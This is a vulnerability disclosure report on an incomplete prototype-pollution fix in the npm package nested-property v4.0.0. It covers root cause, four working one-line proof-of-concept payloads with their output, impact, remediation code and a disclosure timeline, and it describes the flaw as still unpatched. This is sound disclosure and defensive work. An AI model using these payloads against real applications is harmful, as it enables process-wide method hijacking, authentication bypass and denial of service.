# Prototype Pollution Research: Incomplete Fix Bypass in `nested-property` v4.0.0

**Date:** April 2, 2026  
**Researcher:** Ojas Mehta  
**Package:** [`nested-property`](https://www.npmjs.com/package/nested-property) (NPM) — v4.0.0 (latest)  
**Repo visibility:** 🔒 Private  
**Disclosure status:**
- Snyk: Disclosed April 2, 2026 — advisory declined (classified as JS semantics, not package scope)
- MITRE CVE Program: Request filed April 2, 2026 — acknowledgment received (CVE Request 2019608)
- webdav maintainer (Perry Mitchell): Notified April 3, 2026 with full PoC and remediation guidance

---

## 1. Summary

The v4.0.0 fix for prototype pollution in `nested-property` introduces an **incomplete guard** that only blocks mutation of `Object.prototype`. An attacker can still pollute `Array.prototype` and `Function.prototype` by:

- Using a non-plain-object (`[]`, `{}` with array-rooted path) as the root target
- Traversing through `constructor.__proto__`

All **four attack vectors** below are **confirmed reproducible** on the latest published version (v4.0.0, Node.js v22.22.2).

---

## 2. Root Cause

The guard added in v4.0.0 (`nested-property/dist/nested-property.js`, line 166):

```js
if (currentObject === Reflect.getPrototypeOf({})) {
  throw new ObjectPrototypeMutationError("Attempting to mutate Object.prototype");
}
```

`Reflect.getPrototypeOf({})` returns exactly `Object.prototype`. This is a **strict identity comparison against a single object** — it does not protect any other prototype in the chain:

- `Array.prototype` → **unguarded**
- `Function.prototype` → **unguarded**
- Any other built-in prototype → **unguarded**

---

## 3. Confirmed Attack Vectors (v4.0.0)

### Vector 1 — `Array.prototype` pollution via `__proto__` key

```js
np.set({ data: [] }, "data.__proto__.polluted", true);
// Array.prototype.polluted === true  (ALL arrays in process affected)
// Object.prototype.polluted === undefined  (guard incorrectly considered this "safe")
```

### Vector 2 — `Function.prototype` pollution via `constructor.__proto__`

```js
np.set({}, "constructor.__proto__.polluted", true);
// Function.prototype.polluted === true  (ALL functions in process affected)
// Object.prototype.polluted === undefined
```

### Vector 3 — `Array.prototype` pollution via Array root + `constructor.prototype`

```js
np.set([], "constructor.prototype.injected", "owned");
// [].injected === "owned"  (ALL arrays affected)
// ({}).injected === undefined
```

### Vector 4 — `Array.prototype` method hijacking (highest impact)

```js
np.set({ data: [] }, "data.__proto__.toString", () => "HIJACKED");
// [1,2,3].toString() === "HIJACKED"  — native method silently overridden
// ({}).toString() === "[object Object]"  — plain objects unaffected
```

---

## 4. Full PoC

See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.0`.

**Confirmed output:**
```
[1] Array.prototype.polluted: true
[1] Object.prototype.polluted: undefined
[1] [].polluted: true
[2] Function.prototype.polluted: true
[2] (function(){}).polluted: true
[3] [1,2,3].toString(): HIJACKED
[3] ({}).toString(): [object Object]
[4] [].injected: owned
[4] ({}).injected: undefined
```

---

## 5. Impact

| Impact | Scope | Severity |
|---|---|---|
| Array method hijacking (`toString`, `join`, `map`, `filter`, ...) | All arrays in the Node.js process | High |
| Function.prototype pollution (middleware, handlers, callbacks) | All functions in the process | High |
| Process-wide persistence (survives all requests until restart) | Entire application | Critical |
| Silent — no throw, no log | Unlike `Object.prototype` guard | Critical |

**Key distinguisher:** The `Object.prototype` guard in v4.0.0 throws a named `ObjectPrototypeMutationError`. These vectors succeed **silently** — no exception is raised, no log is written. Detection requires active monitoring of prototype chains.

---

## 6. Supply Chain Context

`nested-property` is a transitive dependency of `webdav` v5.9.0 (and other packages). Any application that:

1. Uses `webdav` or similar packages that call `nestedProperty.set()` internally
2. Passes **user-controlled data** through those operations (e.g., WebDAV PROPPATCH, PROPFIND, or resource metadata updates)

...is exposed to process-wide prototype pollution, enabling:

- **Authentication bypass** (if auth checks rely on Array/Function prototype methods downstream)
- **Denial of service** (via method hijacking that causes downstream crashes)
- **Silent data corruption** (polluted methods producing wrong results for all subsequent requests)

---

## 7. Discovery Methodology

1. **Source analysis:** Read `nested-property/dist/nested-property.js`, identified the guard as a single strict identity check against `Reflect.getPrototypeOf({})`.
2. **Guard boundary mapping:** Determined the guard exclusively matches `Object.prototype` — nothing else in the prototype chain.
3. **Vector enumeration:** Systematically tested non-plain-object roots (`[]`, `function(){}`) and indirect traversal paths (`__proto__`, `constructor.__proto__`).
4. **Exploitability confirmation:** Verified method hijacking via `Array.prototype.toString` override; confirmed scope is process-wide and persistent.

---

## 8. Remediation

See [`fix-recommendation.js`](./fix-recommendation.js) for full patched implementation.

### Fix 1 — Extend the prototype guard

```js
const PROTECTED_PROTOS = new Set([
  Object.prototype,
  Array.prototype,
  Function.prototype,
  Number.prototype,
  String.prototype,
  Boolean.prototype,
]);

if (PROTECTED_PROTOS.has(currentObject)) {
  throw new Error("Blocked: mutation of built-in prototype");
}
```

### Fix 2 — Segment-level denylist (defense in depth)

```js
const DANGEROUS_KEYS = ["__proto__", "constructor", "prototype"];
const isSafe = (path) => !path.split(".").some(s => DANGEROUS_KEYS.includes(s));
```

**Both defenses should be applied together.**

---

## 9. Disclosure Timeline

| Date | Action |
|---|---|
| April 2, 2026 | Vulnerability discovered and confirmed on Node.js v22.22.2 |
| April 2, 2026 | Snyk responsible disclosure filed via report@snyk.io |
| April 2, 2026 | MITRE CVE Program request filed (CVE Request 2019608) |
| April 3, 2026 | Direct disclosure to webdav maintainer Perry Mitchell |
| May 4, 2026 | Snyk acknowledges receipt, begins maintainer contact |
| May 11, 2026 | Snyk declines advisory — classifies as JS semantics, not package scope |
| June 4, 2026 | MITRE CVE assignment pending |

---

## 10. Status

**Unpatched in v4.0.0.** Maintainer has been unresponsive since approximately 2020. Active 0-Day as of June 2026.

---

*Research by Ojas Mehta. For questions, contact via GitHub.*
